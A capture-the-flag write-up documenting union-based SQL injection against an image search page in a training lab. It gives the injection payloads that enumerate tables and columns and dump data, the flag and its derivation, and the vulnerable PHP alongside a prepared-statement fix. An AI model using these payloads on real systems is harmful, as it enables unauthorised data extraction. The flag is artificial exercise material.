# SQL_Injection_Images - Documentation

## How I Found It

I navigated to the **Image Search** page (`index.php?page=searchimg`). I noticed it accepts an `id` and `title` to search for images. I tested for SQL Injection by inputting `1 AND 1=1` (True) and `1 AND 1=0` (False). The difference in results (image displayed vs. missing) confirmed the vulnerability.

## Exploitation Steps

1.  **Enumeration:** I converted the Blind SQLi into a Union-Based SQLi to see data on the screen.
    - Payload: `1 UNION SELECT 1, 2`
    - Result: "Title: 2", "Url: 1". This confirmed 2 visible columns.
2.  **Table Extraction:** I retrieved the table name (`list_images`) by injecting:
    - Payload: `1 UNION SELECT table_name, 1 FROM information_schema.tables`
3.  **Column Extraction:** I retrieved the column names (`title`, `comment`) for that table.
    - Payload: `1 UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573`
    - _(Note: The hex code corresponds to "list_images")._
4.  **Data Extraction:** I dumped the content of the table.
    - Payload: `1 UNION SELECT title, comment FROM list_images`
5.  **Deciphering the Flag:**
    - The database output contained a hint: _"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"_
    - **Decrypt MD5:** `1928e8083cf461a51303633093573c46` -> "albatroz".
    - **SHA-256:** `echo -n "albatroz" | shasum -a 256`

## Proof

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

**Vulnerability Type:**

- **OWASP A03:2021 - Injection**.
- **SQL Injection (Union-Based)**.

## How to Fix

The vulnerability exists because the search input is directly concatenated into the SQL query.

**Vulnerable Code:**

```php
$id = $_GET['id'];
$sql = "SELECT url, title FROM list_images WHERE id = " . $id;
```

### The Fix

Use Prepared Statements to separate the SQL logic from the user data.

```php

$stmt = $pdo->prepare('SELECT url, title FROM list_images WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
```
